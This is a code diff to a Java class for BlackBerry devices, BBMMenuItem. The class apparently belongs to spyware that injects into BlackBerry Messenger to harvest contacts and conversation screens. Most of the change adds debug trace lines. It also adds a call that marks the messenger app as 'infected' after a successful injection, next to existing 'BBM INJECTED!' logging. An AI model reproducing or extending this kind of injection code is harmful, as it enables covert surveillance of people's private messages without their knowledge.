@@ -55,6 +55,10 @@ public class BBMMenuItem extends ApplicationMenuItem {
 
 	public void lookForConversationsThread() {
 
+	    //#ifdef DEBUG
+        debug.trace("lookForConversationsThread");
+        //#endif
+        
 		if (t != null) {
 			return;
 		}
@@ -79,6 +83,9 @@ public class BBMMenuItem extends ApplicationMenuItem {
 					+ screen.getUiEngine().getScreenCount());
 
 			//debug.startBuffering(EventLogger.INFORMATION);
+			//#ifdef DEBUG
+            debug.trace("run: "+screen.getClass().getName());
+            //#endif
 			if (screen.getClass().getName().indexOf("BBMContactsScreen") > 0) {
 				contacts.removeAllElements();
 
@@ -96,6 +103,8 @@ public class BBMMenuItem extends ApplicationMenuItem {
 
 				debug.info("BBM INJECTED!");
 				debug.ledStart(Debug.COLOR_GREEN);
+				
+				AppInjectorBBM.getInstance().setInfected();
 
 			} else {
 				debug.warn("BBM NOT INJECTED!");
@@ -233,6 +242,9 @@ public class BBMMenuItem extends ApplicationMenuItem {
 	}
 
 	public void addMenuBBM() {
+	    //#ifdef DEBUG
+        debug.trace("addMenuBBM");
+        //#endif
 		long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
 		// long bbmid = 4470559380030396000L; Non funziona
 		// long bbmid = 5028374280894129973L; Non funziona
@@ -241,6 +253,9 @@ public class BBMMenuItem extends ApplicationMenuItem {
 	}
 
 	public void removeMenuBBM() {
+	    //#ifdef DEBUG
+        debug.trace("removeMenuBBM");
+        //#endif
 		long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
 		ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid, this);
 	}
